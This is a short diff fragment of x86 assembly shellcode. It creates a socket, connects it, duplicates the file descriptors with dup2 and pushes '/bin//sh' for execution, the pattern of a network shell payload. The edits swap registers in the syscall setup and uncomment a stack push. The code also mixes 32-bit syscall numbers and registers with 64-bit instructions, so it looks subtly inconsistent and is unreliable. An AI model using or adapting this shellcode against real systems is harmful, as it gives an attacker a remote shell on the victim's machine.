@@ -11,7 +11,7 @@ _start:
     mov $2, %bl
     mov $1, %cl
     mov $6, %dl
-    mov $359, %eax
+    mov $359, %ax
     syscall
 
     mov %eax, %ebx
@@ -20,7 +20,7 @@ _start:
     push $2
     mov %esp, %ecx
     mov $16, %dl
-    mov $362, %eax
+    mov $362, %ax
     syscall
 
     xor %ecx, %ecx
@@ -36,7 +36,7 @@ dup2:
 
     xor %eax, %eax
     xor %edx, %edx
-    #push %eax
+    push %rax
     push $0x68732f2f
     push $0x6e69622f
     mov %esp, %ebx
